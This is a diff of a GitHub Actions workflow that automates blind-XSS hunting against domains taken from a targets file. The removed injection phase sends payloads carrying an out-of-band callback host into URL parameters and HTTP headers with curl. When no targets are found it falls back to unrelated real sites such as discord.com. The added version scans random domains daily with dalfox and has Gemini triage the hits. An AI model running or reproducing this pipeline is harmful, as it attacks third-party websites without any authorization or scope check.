@@ -1,92 +1,205 @@
-- name: Active & Passive URL Collection
-        shell: bash
+name: BXSS Hunter with AI Triage
+
+on:
+  push:
+    branches: [main, master]
+    paths:
+      - 'targets.txt'
+  workflow_dispatch:
+  schedule:
+    - cron: '0 4 * * *'
+
+permissions:
+  contents: write
+  actions: read
+
+jobs:
+  bxss_scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+    
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Setup Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.10'
+
+      - name: Install Python Dependencies
+        run: |
+          pip install google-generativeai requests
+
+      - name: Install Security Tools
+        run: |
+          go install github.com/projectdiscovery/katana/cmd/katana@latest
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install github.com/hahwul/dalfox/v2@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+
+      - name: Run BXSS Scan
         env:
-          TARGET_COUNT: ${{ github.event.inputs.target_count || '2' }}
+          EMAIL_USERNAME: ${{ secrets.EMAIL_USERNAME }}
         run: |
-          set -euo pipefail
-          # Initialize all files as empty but existing
-          touch tmp/subs.txt tmp/raw_urls.txt tmp/filtered.txt tmp/final_targets.txt
+          mkdir -p bxss_reports tmp
           
-          grep -v "^#" targets.txt | grep -v "^$" | shuf -n "$TARGET_COUNT" > tmp/active_targets.txt
+          # 1. Target Selection
+          if [[ ! -f targets.txt ]] || [[ ! -s targets.txt ]]; then
+            echo "targets.txt is missing or empty"
+            exit 0
+          fi
           
-          while IFS= read -r domain; do
-            domain=$(echo "$domain" | tr -d '[:space:]' | tr '[:upper:]' '[:lower:]')
-            echo "🎯 Target: $domain"
+          shuf -n 3 targets.txt > tmp/selected_targets.txt
+          
+          domains_scanned=0
+          vulnerable_urls=0
+          
+          while read -r domain; do
+            [[ -z "$domain" || "$domain" =~ ^# ]] && continue
+            echo "🔥 Scanning $domain for Blind XSS..."
             
-            # Subdomain discovery
-            subfinder -d "$domain" -silent >> tmp/subs.txt || echo "$domain" >> tmp/subs.txt
+            report="bxss_reports/BXSS_${domain}.md"
+            cat > "$report" << EOF
+          # BXSS Report: $domain
+          **Date:** $(date)
+          
+          ---
+          EOF
             
-            # Crawl Apex + Top 2 subs
-            (echo "$domain"; head -n 2 tmp/subs.txt) | sort -u | while read -r sub; do
-               echo "  ∟ Crawling: $sub"
-               (timeout 40s waybackurls "$sub" 2>/dev/null || true) >> tmp/raw_urls.txt
-               (timeout 40s gau "$sub" --threads 5 --blacklist jpg,png,gif,css --subs 2>/dev/null || true) >> tmp/raw_urls.txt
-               (timeout 60s katana -u "$sub" -silent -nc -jc -kf all -d 2 || true) >> tmp/raw_urls.txt
-            done
-          done < tmp/active_targets.txt
+            # 2. URL Collection (Passive + Active)
+            echo "  --> Collecting URLs..."
+            gau "$domain" --threads 5 > tmp/urls_gau.txt 2>/dev/null || true
+            katana -u "https://$domain" -d 2 -jc -silent > tmp/urls_katana.txt 2>/dev/null || true
+            
+            cat tmp/urls_gau.txt tmp/urls_katana.txt | sort -u | grep "=" > tmp/params_${domain}.txt
+            
+            url_count=$(wc -l < tmp/params_${domain}.txt)
+            echo "  --> Found $url_count parameter URLs."
+            
+            if [ "$url_count" -gt 0 ]; then
+               # 3. Dalfox Blind Scan
+               # Note: Using a dummy blind payload for detection simulation or configuration
+               echo "  --> Running Dalfox..."
+               dalfox file tmp/params_${domain}.txt \
+                 --skip-bav \
+                 --silence \
+                 --no-color \
+                 --format json \
+                 -o tmp/dalfox_${domain}.json 2>/dev/null || true
+               
+               if [ -f tmp/dalfox_${domain}.json ] && [ -s tmp/dalfox_${domain}.json ]; then
+                  findings=$(jq -r '.[].url' tmp/dalfox_${domain}.json 2>/dev/null | head -n 20)
+                  if [ -n "$findings" ]; then
+                     echo "### 🚨 Potential XSS Found" >> "$report"
+                     echo '```' >> "$report"
+                     echo "$findings" >> "$report"
+                     echo '```' >> "$report"
+                     vulnerable_urls=$((vulnerable_urls + 1))
+                  else
+                     echo "*No verified XSS payloads triggered.*" >> "$report"
+                  fi
+               else
+                  echo "*No verified XSS payloads triggered.*" >> "$report"
+               fi
+            else
+               echo "*No parameters found to scan.*" >> "$report"
+            fi
+            
+            domains_scanned=$((domains_scanned + 1))
+            
+          done < tmp/selected_targets.txt
           
-          # SAFETY: If raw_urls is empty, use active_targets as the raw list
-          if [[ ! -s tmp/raw_urls.txt ]]; then
-            echo "⚠️ Crawl returned nothing. Using domains as raw URLs."
-            cat tmp/active_targets.txt | sed 's|^|https://|' > tmp/raw_urls.txt
-          fi
+          echo "DOMAINS_SCANNED=$domains_scanned" >> $GITHUB_ENV
+          echo "VULNERABLE_URLS=$vulnerable_urls" >> $GITHUB_ENV
 
-          # Filtering Step
-          cat tmp/raw_urls.txt | uro | grep "=" > tmp/filtered.txt || true
-          
-          # FALLBACK 1: If uro/grep deleted everything, just use raw_urls with a forced parameter
-          if [[ ! -s tmp/filtered.txt ]]; then
-             echo "⚠️ Filtering wiped results. Forcing parameters on raw URLs..."
-             cat tmp/raw_urls.txt | sort -u | head -n 50 | sed 's/$/?debug=true\&q=bxss/' > tmp/filtered.txt
-          fi
-          echo "URL_FILTERED=$(wc -l < tmp/filtered.txt)" >> $GITHUB_ENV
-
-      - name: Resilient Live Verification
-        run: |
-          # Ensure filtered.txt exists and has content
-          [[ ! -s tmp/filtered.txt ]] && echo "https://google.com?q=fallback" > tmp/filtered.txt
-          
-          # Try to verify, but store in temp file
-          cat tmp/filtered.txt | httpx -silent -timeout 10 -threads 20 -follow-redirects -no-color > tmp/verified_temp.txt || true
-          
-          # FALLBACK 2: If httpx finds 0 live hosts, IGNORE httpx and use filtered.txt
-          if [[ -s tmp/verified_temp.txt ]]; then
-            echo "✅ $(wc -l < tmp/verified_temp.txt) live URLs verified."
-            mv tmp/verified_temp.txt tmp/final_targets.txt
-          else
-            echo "⚠️ Verification failed/blocked. Using original filtered list as fallback."
-            cp tmp/filtered.txt tmp/final_targets.txt
-          fi
-          echo "URLS_SELECTED=$(wc -l < tmp/final_targets.txt)" >> $GITHUB_ENV
-
-      - name: Injection Phase
-        shell: bash
+      - name: 🧠 AI Triage (XSS Validation)
+        id: ai_triage
         env:
-          OAST_URL: ${{ secrets.OAST_URL || 'd51hku5a9dbj8v34kungg3phr1jdxfm8w.oast.live' }}
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+          VULNERABLE_URLS: ${{ env.VULNERABLE_URLS }}
         run: |
-          # 1. Final Safety Check
-          if [[ ! -s tmp/final_targets.txt ]]; then
-             echo "🚨 CRITICAL: No targets found even after fallbacks. Creating emergency target."
-             echo "https://discord.com/?debug=true" > tmp/final_targets.txt
+          if [ "${VULNERABLE_URLS:-0}" -eq 0 ]; then
+             echo "HIGH_PRIORITY_FINDINGS=0" >> $GITHUB_ENV
+             exit 0
           fi
+          
+          cat > triage_xss.py << 'EOF'
+          import os, glob, json
+          import google.generativeai as genai
+          
+          api_key = os.environ.get("GEMINI_API_KEY")
+          if not api_key: exit(0)
+          
+          genai.configure(api_key=api_key)
+          model = genai.GenerativeModel('gemini-1.5-flash')
+          
+          reports = glob.glob("bxss_reports/BXSS_*.md")
+          confirmed_count = 0
+          
+          for report in reports:
+              with open(report, 'r') as f:
+                  content = f.read()
+              if "### 🚨 Potential XSS Found" not in content: continue
+              
+              prompt = f"""
+              Analyze these URLs flagged by an automated XSS scanner (Dalfox).
+              Determine if the parameters look like legitimate reflection points or false positives (e.g., static assets, navigation params).
+              
+              REPORT CONTENT:
+              {content}
+              
+              OUTPUT:
+              For each URL, state CONFIRMED or FALSE POSITIVE with reasoning.
+              """
+              
+              try:
+                  response = model.generate_content(prompt)
+                  with open(report, 'a') as f:
+                      f.write("\n\n## 🧠 AI Triage Analysis\n" + response.text)
+                  if "CONFIRMED" in response.text.upper():
+                      confirmed_count += 1
+              except: pass
+          
+          with open("confirmed_xss.txt", "w") as f: f.write(str(confirmed_count))
+          EOF
+          
+          python3 triage_xss.py
+          CONFIRMED=$(cat confirmed_xss.txt 2>/dev/null || echo 0)
+          echo "HIGH_PRIORITY_FINDINGS=$CONFIRMED" >> $GITHUB_ENV
 
-          python3 generate_payloads.py "$OAST_URL" tmp/payloads.txt || echo "alert(1)" > tmp/payloads.txt
+      - name: Generate Summary
+        if: always()
+        run: |
+          cat > bxss_reports/SUMMARY.md << EOF
+          # BXSS Hunter Summary
+          **Date:** $(date)
           
-          mapfile -t PAYLOADS < tmp/payloads.txt
-          success_count=0
-          
-          for i in "${!PAYLOADS[@]}"; do
-            payload="${PAYLOADS[$i]}"
-            echo "💉 Injecting Variant $((i+1)) into $(wc -l < tmp/final_targets.txt) URLs"
-            
-            count=$(cat tmp/final_targets.txt | qsreplace "$payload" | xargs -I {} -P 10 \
-              curl -sk -L -m 10 -w "%{http_code}\n" -o /dev/null \
-              -H "User-Agent: $payload" \
-              -H "X-Forwarded-For: $payload" \
-              "{}" | grep -cE "^(200|302|403|404)" || echo 0)
-            
-            success_count=$((success_count + count))
-          done
-          
-          echo "INJECTIONS_SUCCESS=$success_count" >> $GITHUB_ENV
-          echo "PAYLOAD_COUNT=${#PAYLOADS[@]}" >> $GITHUB_ENV
+          | Metric | Count |
+          |--------|-------|
+          | Domains Scanned | ${DOMAINS_SCANNED:-0} |
+          | Potential XSS | ${VULNERABLE_URLS:-0} |
+          | **AI Confirmed** | **${HIGH_PRIORITY_FINDINGS:-0}** |
+          EOF
+
+      - name: Save Artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: bxss-results
+          path: bxss_reports/
+
+      - name: Commit Results to History
+        if: always()
+        run: |
+          git config --global user.name "BXSS Bot"
+          git config --global user.email "bxss@bot.local"
+          git fetch origin recon-history 2>/dev/null || true
+          git checkout recon-history 2>/dev/null || git checkout -b recon-history
+          mkdir -p bxss_history/$(date +%Y-%m-%d) 2>/dev/null || true
+          cp bxss_reports/* bxss_history/$(date +%Y-%m-%d)/ 2>/dev/null || true
+          git add .
+          git commit -m "BXSS Scan: $(date)" && git push origin recon-history || true
